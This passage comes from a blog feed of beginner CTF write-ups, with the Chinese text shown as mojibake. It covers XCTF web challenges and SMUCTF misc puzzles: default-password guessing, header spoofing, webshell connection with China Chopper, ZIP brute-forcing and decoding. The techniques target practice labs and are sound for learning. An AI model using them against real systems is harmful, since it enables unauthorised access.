ä¸ªrobots.txtçœ‹çœ‹ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1970713077.png"></p><p>æ¥ç€å°±æŒ‰ä»–æç¤ºèµ°ï¼ŒæˆåŠŸå¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3642322076.png"></p><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>å…ˆè·å–ä¸‹åœºæ™¯å§â€¦<br>æ‰“å¼€å°±æç¤ºçš„å¾ˆæ˜æ˜¾äº†ï¼Œç›´æ¥åŠ index.php.bakåç¼€æŠŠæ–‡ä»¶ä¸‹è½½ä¸‹æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3999939449.png"></p><p>æ‰“å¼€ä¸‹è½½å¥½çš„æ–‡ä»¶å³å¯å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1410479923.png"></p><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>é¢˜ç›®å«cookieï¼Œæ‰€ä»¥å¯èƒ½æ˜¯è¦æ‰¾åˆ°cookie<br>äºæ˜¯f12ï¼Œç½‘ç»œçœ‹çœ‹ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1997628684.png"></p><p>æ¥ç€å°±æŒ‰ç…§å‘ç°åŠ ä¸Šä¸ªåç¼€ï¼Œæœ€åæˆåŠŸæ‰¾åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3011328304.png"></p><h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h2><p>å…ˆè·å–ä¸‹åœºæ™¯ï¼Œæ‰“å¼€æ˜¾ç¤ºå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1002423947.png"></p><p>ä¸èƒ½æŒ‰ï¼Ÿï¼Ÿï¼Ÿæˆ‘å°±è¦æŒ‰ï¼ˆæœç„¶æŒ‰ä¸äº†â€¦ï¼‰<br>æ¥ç€f12çœ‹çœ‹ï¼ˆæœç„¶æœ‰å†…é¬¼åœæ­¢äº¤æ˜“ï¼‰ï¼Œè¿˜å¥½å­¦è¿‡å‡ å¹´Englishï¼Œçœ‹åˆ°æ˜¯disable</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/471716298.png"></p><p>äºæ˜¯å°†disableæ”¹æˆable</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3186872710.png"></p><p>ç„¶åå˜¿å˜¿ï¼Œå°æ ·è¿˜ä¸è®©æˆ‘ç‚¹ï¼Œå°±è¿™æ ·é›†é½ä¸ƒé¾™ç å¬å”¤flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/88905842.png"></p><h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h2><p>æˆ‘çš„Englishè¿˜æ˜¯ä¸é”™çš„ï¼Œweak_auth==å¼±å¯†ç <br>å…ˆè·å–åœºæ™¯åº·åº·ï¼Œä¸‘é™‹çš„ç™»å½•ç•Œé¢â€¦</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1986719062.png"></p><p>æ—¢ç„¶æ˜¯å¼±å¯†ç ï¼Œç”¨æˆ·ååº”è¯¥æ˜¯adminå§ï¼Œå†è¯•è¯•å¯†ç admin</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/173282351.png"></p><p>å±…ç„¶ä¸å¯¹ï¼Œå†è¯•è¯•å…¶ä»–çš„ï¼Œæœ€åè¯•å‡ºæ¥æ˜¯123456</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1087784777.png"></p><p>æ‰“å¼€å°±çœ‹åˆ°flagäº†</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/19471270.png"></p><h2 id="SimpleRAR"><a href="#SimpleRAR" class="headerlink" title="SimpleRAR"></a>SimpleRAR</h2><p>è·å–åœºæ™¯åå‘ç°æ˜¯é“ä»£ç å®¡è®¡çš„é¢˜ï¼Œé‚£å°±çœ‹çœ‹è¿™PHPä»£ç </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2616921345.png"></p><p>ä»ä¸­æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼šæ—¢è¦ä¿è¯è¾“å‡ºaï¼Œbï¼Œåˆè¦ä¿è¯$bæ˜¯æ•°å­—<br>äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œæ„é€ ï¼ša=c&amp;b=2222aï¼Œä»è€Œå¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3113064903.png"></p><h2 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h2><p>è·å–åœºæ™¯ï¼Œæ‰“å¼€çœ‹è§å¦‚ä¸‹æç¤ºï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1986579755.png"></p><p>äºæ˜¯æŒ‰ç…§è¦æ±‚åŠ ä¸Šåç¼€â€œindex.php?a=1â€,å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2559118209.png"></p><p>ç„¶åå°±f12ä½¿ç”¨hackbarè®©b=2ï¼Œæ“ä½œå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2432159975.png"></p><p>æœ€ç»ˆå¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4081430940.png"></p><h2 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h2><p>è¿™é¢˜æˆ‘åšä¸å‡ºæ¥..çœ‹äº†åˆ«äººå†™çš„wp<br>é¦–å…ˆæ¥äº†è§£ä¸€ä¸‹é¢˜ç›®æ„æ€ï¼š</p><blockquote><p>xffæ˜¯httpçš„æ‹“å±•å¤´éƒ¨ï¼Œä½œç”¨æ˜¯ä½¿WebæœåŠ¡å™¨è·å–è®¿é—®ç”¨æˆ·çš„IPçœŸå®åœ°å€ï¼ˆå¯ä¼ªé€ ï¼‰ã€‚ç”±äºå¾ˆå¤šç”¨æˆ·é€šè¿‡ä»£ç†æœåŠ¡å™¨è¿›è¡Œè®¿é—®ï¼ŒæœåŠ¡å™¨åªèƒ½è·å–ä»£ç†æœåŠ¡å™¨çš„IPåœ°å€ï¼Œè€Œxffçš„ä½œç”¨åœ¨äºè®°å½•ç”¨æˆ·çš„çœŸå®IPï¼Œä»¥åŠä»£ç†æœåŠ¡å™¨çš„IPã€‚<br>x-forwarded-forï¼Œç”¨æ¥è¯†åˆ«é€šè¿‡HTTPä»£ç†æˆ–è´Ÿè½½å‡è¡¡æ–¹å¼è¿æ¥åˆ°WebæœåŠ¡å™¨çš„å®¢æˆ·ç«¯æœ€åŸå§‹çš„IPåœ°å€çš„HTTPè¯·æ±‚å¤´å­—æ®µ<br>æ ¼å¼ä¸ºï¼šX-Forwarded-For: æœ¬æœºIP, ä»£ç†1IP, ä»£ç†2IP, ä»£ç†2IP<br>refereræ˜¯httpçš„æ‹“å±•å¤´éƒ¨ï¼Œä½œç”¨æ˜¯è®°å½•å½“å‰è¯·æ±‚é¡µé¢çš„æ¥æºé¡µé¢çš„åœ°å€ã€‚æœåŠ¡å™¨ä½¿ç”¨refererç¡®è®¤è®¿é—®æ¥æºï¼Œå¦‚æœrefererå†…å®¹ä¸ç¬¦åˆè¦æ±‚ï¼ŒæœåŠ¡å™¨å¯ä»¥æ‹¦æˆªæˆ–è€…é‡å®šå‘è¯·æ±‚ã€‚å‘Šè¯‰æœåŠ¡å™¨è¯¥ç½‘é¡µæ˜¯ä»å“ªä¸ªé¡µé¢é“¾æ¥è¿‡æ¥çš„</p></blockquote><p>æ¥ç€æˆ‘ä»¬æ¥è·å–åœºæ™¯ã€‚å‘ç°ä»–ç»™å‡ºæç¤ºï¼šipåœ°å€å¿…é¡»ä¸º123.123.123.123<br>æ‰€ä»¥æˆ‘ä»¬burpæŠ“åŒ…ï¼Œåœ¨è¯·æ±‚å¤´ä¸­æ·»åŠ X-Forwarded-Forï¼š123.123.123.123<br>æäº¤è¯·æ±‚åï¼Œæç¤ºå¿…é¡»æ¥è‡ª<a href="https://www.google.com/">https://www.google.com</a></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1656454749.png"></p><p>æ¥ç€åœ¨è¯·æ±‚å¤´ä¸­æ·»åŠ refereeï¼š<a href="https://www.google.com/">https://www.google.com</a>ï¼Œä»è€Œå¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/626563710.png"></p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>å…ˆè·å–ä¸‹åœºæ™¯å§ï¼Œæ‰“å¼€ä¸€çœ‹ï¼Œå®ƒæç¤ºçš„å¾ˆæ˜æ˜¾äº†ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3944267940.png"></p><p>è¿™æ—¶ï¼Œéœ€è¦ç”¨åˆ°ä¸€ä¸ªå·¥å…·ï¼šä¸­å›½èœåˆ€ï¼ˆæˆ–è€…èšå‰‘ä¹Ÿå¯ä»¥ï¼‰è¿›è¡Œå¦‚ä¸‹æ“ä½œ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/628947422.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2795818597.png"></p><p>ä»ä¸­å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå¾ˆæ˜¾ç›®çš„flagæ–‡æ¡£ï¼Œå°±è¿™æ ·æˆåŠŸæ‹¿åˆ°äº†flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2250347618.png"></p><h2 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h2><p>å…ˆè·å–åœºæ™¯ï¼Œæ‰“å¼€å¦‚ä¸‹ï¼š<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3214803999.png"></p><p>å›å¤´çœ‹é¢˜ç›®æç¤ºè¯´æ²¡æœ‰å†™waf<br>emmmmï¼Œå…ˆç™¾åº¦äº†è§£ä¸€ä¸‹waf<br>é“¾æ¥ï¼š<a href="https://baike.baidu.com/item/WAF/3239498?fr=aladdin">https://baike.baidu.com/item/WAF/3239498?fr=aladdin</a><br>å¥½å§ï¼Œæ²¡å•¥æ€è·¯â€¦å»ç™¾åº¦çœ‹çœ‹å¤§ä½¬ä»¬çš„wp<br>åŸæ–‡ï¼š<a href="https://www.cnblogs.com/wushengyang/p/12507740.html">https://www.cnblogs.com/wushengyang/p/12507740.html</a><br>ä¸æ„§æ˜¯å¤§ä½¬ï¼Œæ‡‚äº†ï¼Œå¼€å§‹æ“ä½œï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1223323418.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1058220401.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/148472205.png"></p><h2 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h2><p>è·å–åœºæ™¯ï¼Œæ‰“å¼€æœ‰ä¸ªå¼¹çª—ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1130079787.png"></p><p>é‚£å°±å…ˆè¯•è¯•å¯†ç ï¼Œä¸å¯¹â€¦</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3805453008.png"></p><p>ä¸è¿‡è·³å‡ºä¸ªæºç æ¥ï¼Œé‚£å°±çœ‹çœ‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/957676602.png"></p><p>ä»£ç å®¡è®¡ï¼Œå¥½å§ï¼Œæ¥ä¸‹æ¥æˆ‘ä¹Ÿä¸ä¼šäº†â€¦è¿˜æ˜¯çœ‹çœ‹å¤§ä½¬å†™çš„wp<br>çœŸæ­£çš„flagæ˜¯ <code>\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30</code><br>ç„¶åå°±å¼€å§‹è·‘è„šæœ¬ï¼Œå¾—å‡ºflagé™„ä¸Šå¤§ä½¬çš„è„šæœ¬ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a &#x3D; &#39;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&#39;</span><br><span class="line"># print(a)</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">a &#x3D; a.split(&#39;,&#39;)</span><br><span class="line">for i in a:</span><br><span class="line">  flag +&#x3D; chr(int(i))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3071799467.png"></p><blockquote><p>ä»¥ä¸Šå°±æ˜¯æ”»é˜²ä¸–ç•Œwebæ–°æ‰‹åŒºæ‰€æœ‰çš„wp<br>è‹¥å“ªæœ‰é—®é¢˜ï¼Œæ¬¢è¿å¸ˆå‚…ä»¬åº•ä¸‹ç•™è¨€</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>The first SMUCTF</title>
      <link href="2020/02/13/The%20first%20SMUCTF/"/>
      <url>2020/02/13/The%20first%20SMUCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>æ‰“å¼€åœ°å€ï¼Œä¾¿å¯ä»¥å‘ç°æœ¬é¢˜çš„flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2214784607.png"></p><h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><p>æ‰“å¼€åœ°å€ï¼Œä½ ä¼šçœ‹åˆ°ä¸Šé¢æ˜¾ç¤ºâ€œwhere is flagâ€</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1446018571.png"></p><p>å¹¶ä¸”æ— æ³•æŸ¥çœ‹æºä»£ç ï¼Œäºæ˜¯éœ€è¦åŠ ä¸Šå‰ç¼€</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2281388779.png"></p><p>è¿™æ—¶å°±å¯ä»¥æŸ¥çœ‹æºä»£ç ï¼Œæ‰¾å‡ºflag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/374980764.png"></p><h2 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h2><p>é¦–å…ˆï¼Œå°†æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ã€‚ä½ ä¼šå‘ç°æ˜¯ä¸ªgifæ ¼å¼ï¼Œç„¶åå°±å¯ä»¥ç”¨2345çœ‹å›¾ç‹æ‰“å¼€ï¼Œé€å¸§çš„è¿›è¡ŒæŸ¥çœ‹ï¼Œå°±ä¼šå‘ç°æœ‰ä¸€ä¸²å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯å‹ç¼©åŒ…å¯†ç </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/186462552.png"></p><p>æœ€åï¼Œæ‰“å¼€åå°±æ‰¾åˆ°äº†flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3874074453.png"></p><h2 id="è°æ˜¯DJ"><a href="#è°æ˜¯DJ" class="headerlink" title="è°æ˜¯DJ"></a>è°æ˜¯DJ</h2><p>é¦–å…ˆï¼Œé¢˜ç›®ç»™äº†ä¸€ä¸ªæç¤ºï¼šDJæœ‰ä¸ªåŸŸåï¼šctf.djboke.topã€‚æ‰“å¼€ä¸€çœ‹å°±æ˜¯æ¯”èµ›å¹³å°ï¼Œæœ‰ç‚¹åƒé’“é±¼ç½‘ç«™ï¼Œè®©äººå¤´å¤§ï¼Œæ— æ³•ä¸‹æ‰‹ã€‚æƒ³äº†è®¸ä¹…ï¼Œæœ€åé€šè¿‡ä¸Šè¯¾å­¦çš„åŠ ä¸Šç™¾åº¦ï¼Œæˆ‘å‘ç°å¯ä»¥æŸ¥åŸŸåè§£æè®°å½•ã€‚äºæ˜¯æ‰“å¼€cmdï¼Œç”¨nslookup -qt=txt+åŸŸåä¾¿å¯ä»¥æ‰¾åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3137680496.png"></p><h2 id="ä¸€ä»½å¥‡æ€ªçš„ç¼–ç "><a href="#ä¸€ä»½å¥‡æ€ªçš„ç¼–ç " class="headerlink" title="ä¸€ä»½å¥‡æ€ªçš„ç¼–ç "></a>ä¸€ä»½å¥‡æ€ªçš„ç¼–ç </h2><p>é¦–å…ˆï¼Œä¸‹è½½æ–‡ä»¶ã€‚æ‰“å¼€ä¸€çœ‹æ˜¯ä¸€å †çš„ä»£ç ï¼Œæ¥ç€ï¼Œå°±æƒ³åˆ°ç”¨base64è½¬å›¾ç‰‡ã€‚äºæ˜¯ç™¾åº¦base64è½¬å›¾ç‰‡åœ¨çº¿å·¥å…·ï¼Œå¹¶åœ¨ä»£ç å‰åŠ ä¸Šå…¶ç±»å‹jpgï¼Œè¿›è¡Œè½¬æ¢<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/588851139.png"></p><p>ç„¶åæŠŠå›¾ç‰‡ä¸‹è½½ä¸‹æ¥ï¼Œæ”¾å…¥è™šæ‹Ÿæœºé‡Œé¢ï¼Œç”¨binwalkå°±ä¼šå‘ç°é‡Œé¢è¿˜æœ‰ä¸ªå‹ç¼©åŒ…ï¼Œæœ‰ä¸€ä¸ªåŠ å¯†çš„flagå’Œå›¾ç‰‡ï¼Œäºæ˜¯å°±å¾—ä»å›¾ç‰‡å…¥æ‰‹æ‰¾åˆ°å¯†ç </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2428741399.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3269813088.png"></p><p>å°†å›¾ç‰‡ä¸‹è½½ï¼Œç”¨ä¸€ä¸ªç¥ä»™ç½‘ç«™æŠŠå›¾ç‰‡ç§’è§£ï¼Œå¾—åˆ°å¯†ç </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/52180931.png"></p><p>ç„¶åè§£å¼€åŠ å¯†çš„æ–‡ä»¶ï¼Œæ‰“å¼€å°±æ˜¯å¦‚ä¸‹çš„ä¸€ä¸²ç </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3396807991.png"></p><p>ç„¶åç”¨base64è§£ç ï¼Œflagå°±å‡ºæ¥äº†</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/619009714.png"></p><h2 id="ä¸çˆ½çš„çŒ«"><a href="#ä¸çˆ½çš„çŒ«" class="headerlink" title="ä¸çˆ½çš„çŒ«"></a>ä¸çˆ½çš„çŒ«</h2><p>é¦–å…ˆä¸‹è½½æ–‡ä»¶ï¼ŒåŠ ä¸Šåç¼€zipï¼Œæ‰“å¼€å‹ç¼©åŒ…</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/545832246.png"></p><p>å‘ç°å‹ç¼©åŒ…éœ€è¦å¯†ç ï¼Œäºæ˜¯ç”¨æš´åŠ›ç ´è§£æ¥è§£å‡ºå¯†ç ï¼Œä»è€Œå¾—åˆ°å›¾ç‰‡</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2358408614.png"></p><p>è¿™æ—¶ï¼Œå‘ç°å›¾ç‰‡æ˜¯ä¸ªäºŒç»´ç ï¼Œéœ€è¦ç”¨PSå¤åŸå®šä½ç‚¹ï¼Œå¾—åˆ°äºŒç»´ç </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4016329068.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3806926906.png"></p><p>ç„¶åæ‰«äºŒç»´ç å¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼Œè§£å‡ºä¸€ä¸ªæ–‡ä»¶ï¼Œæ¥ç€ç”¨winhexå°†å…¶æ”¹ä¸ºpngæ ¼å¼ï¼Œä¿å­˜å®Œå…³é—­ï¼Œå°†maoåŠ ä¸Šåç¼€ï¼Œå°±ä¼šå‡ºç°ä¸€å¼ å›¾ç‰‡</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/686023652.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2389994645.png"></p><p>æœ€åå°†å›¾ç‰‡ä¸­çš„ç ç”¨base32è§£ç ï¼Œå°±å¯ä»¥å¼„å‡ºflag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/927400189.png"></p><h2 id="ç®€å•æ‚é¡¹"><a href="#ç®€å•æ‚é¡¹" class="headerlink" title="ç®€å•æ‚é¡¹"></a>ç®€å•æ‚é¡¹</h2><p>é¦–å…ˆä¸‹è½½æ–‡ä»¶ï¼Œå‘ç°ç»™åŠ å¯†äº†ï¼ŒåŠ ä¸Šæç¤ºå­¦å·æ˜¯å‡ ä½ï¼Œå°±å¾—çŸ¥äº†å¯†ç å¯èƒ½å°±æ˜¯æŸä½å­¦é•¿çš„å­¦å·ï¼Œ11ä½çš„æ•°å­—ï¼Œäºæ˜¯å°±å¼€å§‹æš´åŠ›ç ´è§£</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2892425653.png"></p><p>å¾—åˆ°å¯†ç ï¼Œå°±å¾—åˆ°ä¸€å¼ ç…§ç‰‡ï¼Œè²Œä¼¼æ¯«æ— ç”¨å¤„ï¼Œç”¨binwalkå‘ç°å°±åªæ˜¯ä¸€å¼ å›¾ç‰‡è€Œå·²ã€‚å°±å¼€å§‹å„ç§å°è¯•ï¼Œæœ€åå°†å®ƒè½¬ä¸ºtxtæ ¼å¼ï¼Œçœ‹ç€å¥½åƒå°±æ˜¯ä¸€å †ä¹±ç ï¼Œæœä¸å‡ºflagã€‚æ¥ç€å°±ç”¨base64ç¼–ç flag,å¾—åˆ°emhlc2hpZmxhZw==ã€‚äºæ˜¯å°±å¼€å§‹æœç´¢è¿™ä¸ªï¼Œæœç„¶æ‰¾åˆ°äº†ä¸€ä¸²å­—ç¬¦ï¼Œæ¥ç€ç”¨base64è§£ç å¾—åˆ°zheshiflagï¼Œä¹Ÿè®¸è¿™å°±æ˜¯flagäº†ï¼Œäºæ˜¯å°è¯•è¾“å…¥flag{zheshiflag}ï¼Œç»“æœå°±å¯¹äº†</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/692482126.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3282228628.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2188370906.png"></p><h2 id="incloude"><a href="#incloude" class="headerlink" title="incloude?"></a>incloude?</h2><p>é¦–å…ˆï¼Œæ‰“å¼€åœ°å€ï¼ŒçŸ¥é“è¿™æ˜¯å…³äºæ–‡ä»¶åŒ…å«çš„é¢˜ç›®å¹¶ä¸”å‘ç°è¿™æ˜¯pathè¯·æ±‚ï¼Œäºæ˜¯å°±åŠ ä¸Šäº†ä»¥ä¸‹çš„ä¸€ä¸ªåç¼€ï¼Œå¾—åˆ°ä¸€ä¸²ç </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/180761087.png"></p><p>æœ€åç”¨base64è§£ç å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1408905.png"></p><h2 id="postå’Œget"><a href="#postå’Œget" class="headerlink" title="postå’Œget"></a>postå’Œget</h2><p>æ‰“å¼€åœ°å€ï¼ŒæŸ¥çœ‹å…ƒç´ ï¼Œç”±ä»£ç å¯çŸ¥è¦get=postï¼Œå…ˆè®©get=1</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1393395659.png"></p><p>ç„¶åä½¿ç”¨æ’ä»¶max hackbar,ç‚¹å‡»load url,ä¾¿å¯ä»¥çœ‹åˆ°å¦‚ä¸‹çš„æƒ…å†µ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2782952618.png"></p><p>ç„¶åç‚¹å‡»post dataï¼Œè®©post=1ï¼Œä½¿get=post<br>æœ€åç‚¹å‡»executionï¼Œå¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/43708867.png"></p><h2 id="top1"><a href="#top1" class="headerlink" title="top1"></a>top1</h2><p>æ‰“å¼€åœ°å€å‡ºç°äº†ä¸€ä¸ªç™»å½•æ¡†ï¼Œæ¯«æ— å¤´ç»ªâ€¦<br>åæ¥åœ¨ç¾¤é‡Œçœ‹åˆ°äº†ä¸€äº›ä¸å¾—äº†çš„ä¸œè¥¿ï¼Œäºæ˜¯çŒœäº†ä¸€äº›å¸¸è§çš„ç”¨æˆ·å¯†ç æœ€åå¾—çŸ¥äº†è´¦å·å°±æ˜¯adminï¼Œå¯†ç å°±æ˜¯123456.<br>è€Œä¸”è¿è§£ç éƒ½ä¸è¦ï¼Œç›´æ¥å¾—åˆ°flagã€‚ä½†æ˜¯æ²¡å¾—å¤åˆ¶â€¦</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2959754613.png"></p><h2 id="Null"><a href="#Null" class="headerlink" title="Null"></a>Null</h2><p>æ‰“å¼€ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œå°±å¼€å§‹çŒœflagï¼Œåˆšå¼€å§‹è¾“Nullç»“æœé”™è¯¯ï¼Œæ¥ç€è¾“å…¥nullå°±å¯¹äº†</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SMUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFç®€ä»‹</title>
      <link href="2020/02/13/CTF%E7%AE%80%E4%BB%8B/"/>
      <url>2020/02/13/CTF%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<p>CTFï¼ˆCapture The Flagï¼‰ä¸­æ–‡ä¸€èˆ¬è¯‘ä½œå¤ºæ——èµ›ï¼Œåœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸä¸­æŒ‡çš„æ˜¯ç½‘ç»œå®‰å…¨æŠ€æœ¯äººå‘˜ä¹‹é—´è¿›è¡ŒæŠ€æœ¯ç«æŠ€çš„ä¸€ç§æ¯”èµ›å½¢å¼ã€‚CTFèµ·æºäº1996å¹´DEFCONå…¨çƒé»‘å®¢å¤§ä¼šï¼Œä»¥ä»£æ›¿ä¹‹å‰é»‘å®¢ä»¬é€šè¿‡äº’ç›¸å‘èµ·çœŸå®æ”»å‡»è¿›è¡ŒæŠ€æœ¯æ¯”æ‹¼çš„æ–¹å¼ã€‚å‘å±•è‡³ä»Šï¼Œå·²ç»æˆä¸ºå…¨çƒèŒƒå›´ç½‘ç»œå®‰å…¨åœˆæµè¡Œçš„ç«èµ›å½¢å¼ã€‚</p><p>CTFç«èµ›æ¨¡å¼å…·ä½“åˆ†ä¸ºä»¥ä¸‹ä¸‰ç±»ï¼š<br>è§£é¢˜æ¨¡å¼ï¼ˆJeopardyï¼‰ã€æ”»é˜²æ¨¡å¼ï¼ˆAttack-Defenseï¼‰ã€æ··åˆæ¨¡å¼ï¼ˆMixï¼‰</p><p>é»‘ç›¾æ¯ï¼Œç™¾è¶Šæ¯</p><h3 id="ä¸€ã€è§£ä½“æ¨¡å¼ï¼ˆJeopardyï¼‰"><a href="#ä¸€ã€è§£ä½“æ¨¡å¼ï¼ˆJeopardyï¼‰" class="headerlink" 